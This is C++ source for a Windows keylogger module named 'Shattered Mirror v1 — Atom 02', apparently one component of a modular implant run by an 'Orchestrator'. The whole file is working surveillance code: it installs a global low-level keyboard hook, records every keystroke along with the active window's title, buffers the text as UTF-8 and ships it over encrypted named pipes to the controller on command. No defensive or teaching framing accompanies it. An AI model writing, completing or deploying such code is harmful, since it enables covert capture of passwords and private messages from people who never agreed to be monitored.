/*=============================================================================
 * Shattered Mirror v1 — Atom 02: Keystroke Capture (Unicode/UTF-8)
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports on report pipe.
 *===========================================================================*/

#include "Atom_02_Key.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdarg>
#include <cstdio>
#include <string>
#include <winnls.h>

#pragma comment(lib, "user32.lib")

// ===== DEBUG FILE LOGGING =====
static void KeylogDebug(const char *format, ...) {
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\keylog_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
  printf("%s\n", buf);
}

/* The ring buffer for keystrokes (UTF-8 encoded) */
static char s_KeyBuffer[KEYLOG_BUFFER_SIZE] = {0};
static DWORD s_dwBufferIndex = 0;
static DWORD s_dwKeyCount = 0;

/* Handle to the hook */
static HHOOK s_hKeyHook = NULL;

/* Pipe handles for IPC */
static HANDLE s_hCmdPipe = NULL;    // Receives commands from Orchestrator
static HANDLE s_hReportPipe = NULL; // Sends reports to Orchestrator
static BYTE s_SharedSessionKey[16];

/* Track window changes */
static HWND s_hLastWindow = NULL;

/*
 * Enhanced key translation – uses ToUnicodeEx to respect the active keyboard
 * layout. Returns the number of wide characters written to szOut (max 16).
 */
static int TranslateKeyEx(DWORD vkCode, DWORD scanCode, BYTE *keyboardState,
                          WCHAR *szOut, int maxChars) {
  if (maxChars < 1)
    return 0;

  HKL hLayout = GetKeyboardLayout(0);

  BOOL bCtrl = (keyboardState[VK_CONTROL] & 0x80) != 0;
  BOOL bAlt = (keyboardState[VK_MENU] & 0x80) != 0;
  BOOL bShift = (keyboardState[VK_SHIFT] & 0x80) != 0;
  BOOL bWin =
      (keyboardState[VK_LWIN] & 0x80) || (keyboardState[VK_RWIN] & 0x80);

  WCHAR buffer[16] = {0};
  int result =
      ToUnicodeEx(vkCode, scanCode, keyboardState, buffer, 16, 0, hLayout);

  if (result > 0) {
    int charsToCopy = min(result, maxChars - 1);
    wcsncpy_s(szOut, maxChars, buffer, charsToCopy);
    szOut[charsToCopy] = L'\0';
    return charsToCopy;
  } else if (result < 0) {
    szOut[0] = L'\0';
    return 0;
  }

  const char *specialName = NULL;
  switch (vkCode) {
  case VK_RETURN:
    specialName = "[ENTER]";
    break;
  case VK_BACK:
    specialName = "[BACKSPACE]";
    break;
  case VK_TAB:
    specialName = "[TAB]";
    break;
  case VK_SPACE:
    specialName = " ";
    break;
  case VK_ESCAPE:
    specialName = "[ESC]";
    break;
  case VK_DELETE:
    specialName = "[DEL]";
    break;
  case VK_INSERT:
    specialName = "[INS]";
    break;
  case VK_HOME:
    specialName = "[HOME]";
    break;
  case VK_END:
    specialName = "[END]";
    break;
  case VK_PRIOR:
    specialName = "[PGUP]";
    break;
  case VK_NEXT:
    specialName = "[PGDN]";
    break;
  case VK_LEFT:
    specialName = "[LEFT]";
    break;
  case VK_RIGHT:
    specialName = "[RIGHT]";
    break;
  case VK_UP:
    specialName = "[UP]";
    break;
  case VK_DOWN:
    specialName = "[DOWN]";
    break;
  case VK_CAPITAL:
    specialName = "[CAPS]";
    break;
  case VK_NUMLOCK:
    specialName = "[NUMLOCK]";
    break;
  case VK_SCROLL:
    specialName = "[SCROLL]";
    break;
  case VK_SNAPSHOT:
    specialName = "[PRTSC]";
    break;
  case VK_PAUSE:
    specialName = "[PAUSE]";
    break;
  case VK_LWIN:
    specialName = "[LWIN]";
    break;
  case VK_RWIN:
    specialName = "[RWIN]";
    break;
  case VK_APPS:
    specialName = "[MENU]";
    break;
  case VK_F1:
    specialName = "[F1]";
    break;
  case VK_F2:
    specialName = "[F2]";
    break;
  case VK_F3:
    specialName = "[F3]";
    break;
  case VK_F4:
    specialName = "[F4]";
    break;
  case VK_F5:
    specialName = "[F5]";
    break;
  case VK_F6:
    specialName = "[F6]";
    break;
  case VK_F7:
    specialName = "[F7]";
    break;
  case VK_F8:
    specialName = "[F8]";
    break;
  case VK_F9:
    specialName = "[F9]";
    break;
  case VK_F10:
    specialName = "[F10]";
    break;
  case VK_F11:
    specialName = "[F11]";
    break;
  case VK_F12:
    specialName = "[F12]";
    break;
  default: {
    if (bCtrl || bAlt || bWin) {
      char combo[32] = "[";
      if (bCtrl)
        strcat_s(combo, "CTRL+");
      if (bAlt)
        strcat_s(combo, "ALT+");
      if (bWin)
        strcat_s(combo, "WIN+");
      char keyName[16];
      UINT scanCodeExtended = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
      GetKeyNameTextA(scanCodeExtended << 16, keyName, sizeof(keyName));
      strcat_s(combo, keyName);
      strcat_s(combo, "]");
      MultiByteToWideChar(CP_ACP, 0, combo, -1, szOut, maxChars);
      return (int)wcslen(szOut);
    }
    szOut[0] = L'\0';
    return 0;
  }
  }

  if (specialName) {
    MultiByteToWideChar(CP_ACP, 0, specialName, -1, szOut, maxChars);
    return (int)wcslen(szOut);
  }
  szOut[0] = L'\0';
  return 0;
}

BOOL FlushKeyBufferToIPC();

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
    KBDLLHOOKSTRUCT *pkbhs = (KBDLLHOOKSTRUCT *)lParam;

    HWND hForeground = GetForegroundWindow();
    if (hForeground != s_hLastWindow) {
      s_hLastWindow = hForeground;
      char szTitle[256] = {0};
      GetWindowTextA(hForeground, szTitle, 255);

      char szHeader[300];
      wsprintfA(szHeader, "\r\n\r\n[WND: %s]\r\n", szTitle);

      DWORD headerLen = lstrlenA(szHeader);
      if (s_dwBufferIndex + headerLen < KEYLOG_BUFFER_SIZE) {
        lstrcpyA(&s_KeyBuffer[s_dwBufferIndex], szHeader);
        s_dwBufferIndex += headerLen;
      }
    }

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR szWideKey[16] = {0};
    int chars = TranslateKeyEx(pkbhs->vkCode, pkbhs->scanCode, keyboardState,
                               szWideKey, 16);
    if (chars > 0) {
      char szUtf8Key[64] = {0};
      int utf8Len = WideCharToMultiByte(CP_UTF8, 0, szWideKey, chars, szUtf8Key,
                                        sizeof(szUtf8Key) - 1, NULL, NULL);
      if (utf8Len > 0 && (s_dwBufferIndex + utf8Len < KEYLOG_BUFFER_SIZE)) {
        lstrcpyA(&s_KeyBuffer[s_dwBufferIndex], szUtf8Key);
        s_dwBufferIndex += utf8Len;
        s_dwKeyCount++;
        KeylogDebug("[Keylog] Captured: %s (Buf: %lu, Keys: %lu)", szUtf8Key,
                    s_dwBufferIndex, s_dwKeyCount);
      }

      if (s_dwKeyCount >= 5 || s_dwBufferIndex > 100) {
        FlushKeyBufferToIPC();
      }
    }
  }

  return CallNextHookEx(s_hKeyHook, nCode, wParam, lParam);
}

BOOL FlushKeyBufferToIPC() {
  if (s_dwBufferIndex == 0) {
    KeylogDebug("[Keylog] Flush called but buffer empty.");
    return TRUE;
  }

  KeylogDebug("[Keylog] >>> FlushKeyBufferToIPC ENTERED. BufferIndex=%lu",
              s_dwBufferIndex);

  IPC_MESSAGE msg = {0};
  msg.dwSignature = 0x534D4952;
  msg.CommandId = CMD_REPORT;
  msg.dwPayloadLen = s_dwBufferIndex;
  memcpy(msg.Payload, s_KeyBuffer, s_dwBufferIndex);

  BOOL bSuccess = IPC_SendMessage(s_hReportPipe, &msg, s_SharedSessionKey, 16);
  KeylogDebug("[Keylog] >>> IPC_SendMessage returned %d", bSuccess);

  if (bSuccess) {
    KeylogDebug("[Keylog] IPC send successful. Buffer cleared.");
    memset(s_KeyBuffer, 0, KEYLOG_BUFFER_SIZE);
    s_dwBufferIndex = 0;
    s_dwKeyCount = 0;
  } else {
    KeylogDebug("[Keylog] IPC send FAILED! Error: %lu", GetLastError());
  }
  return bSuccess;
}

DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  KeylogDebug("[Keylog] Atom 2 started. Atom ID: %lu", dwAtomId);

  // 1. Connect to command pipe (receive commands from Orchestrator)
  s_hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!s_hCmdPipe) {
    KeylogDebug("[Keylog] IPC_ConnectToCommandPipe FAILED! Error: %lu",
                GetLastError());
    return 1;
  }
  KeylogDebug("[Keylog] Connected to command pipe.");

  // 2. Connect to report pipe (send reports to Orchestrator)
  s_hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!s_hReportPipe) {
    KeylogDebug("[Keylog] IPC_ConnectToReportPipe FAILED! Error: %lu",
                GetLastError());
    CloseHandle(s_hCmdPipe);
    return 1;
  }
  KeylogDebug("[Keylog] Connected to report pipe.");

  memcpy(s_SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(s_hReportPipe, &readyMsg, s_SharedSessionKey, 16);
  KeylogDebug("[Keylog] Sent CMD_READY.");

  s_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                GetModuleHandle(NULL), 0);
  if (!s_hKeyHook) {
    KeylogDebug("[Keylog] SetWindowsHookEx FAILED! Error: %lu", GetLastError());
    CloseHandle(s_hCmdPipe);
    CloseHandle(s_hReportPipe);
    return 1;
  }
  KeylogDebug("[Keylog] Low-level keyboard hook installed.");

  MSG msg;
  BOOL bRunning = TRUE;
  while (bRunning) {
    // 1. Process all pending window messages (for the hook)
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
      if (msg.message == WM_QUIT) {
        bRunning = FALSE;
        break;
      }
      TranslateMessage(&msg);
      DispatchMessage(&msg);
    }
    if (!bRunning) break;

    // 2. Check command pipe for CMD_TERMINATE or CMD_EXECUTE
    DWORD dwAvail = 0;
    if (PeekNamedPipe(s_hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(s_hCmdPipe, &inMsg, s_SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_TERMINATE) {
          KeylogDebug("[Keylog] Received CMD_TERMINATE. Flushing and Exiting.");
          FlushKeyBufferToIPC();
          bRunning = FALSE;
        } else if (inMsg.CommandId == CMD_EXECUTE) {
          std::string cmd((char *)inMsg.Payload, inMsg.dwPayloadLen);
          if (cmd == "FLUSH") {
            FlushKeyBufferToIPC();
          } else if (cmd == "STOP") {
            KeylogDebug("[Keylog] Received STOP command. Flushing and Exiting.");
            FlushKeyBufferToIPC();
            bRunning = FALSE;
          }
        }
      }
    }
    Sleep(20); // Prevent CPU pegging
  }

  UnhookWindowsHookEx(s_hKeyHook);
  CloseHandle(s_hCmdPipe);
  CloseHandle(s_hReportPipe);
  KeylogDebug("[Keylog] Atom 2 exiting.");
  return 0;
}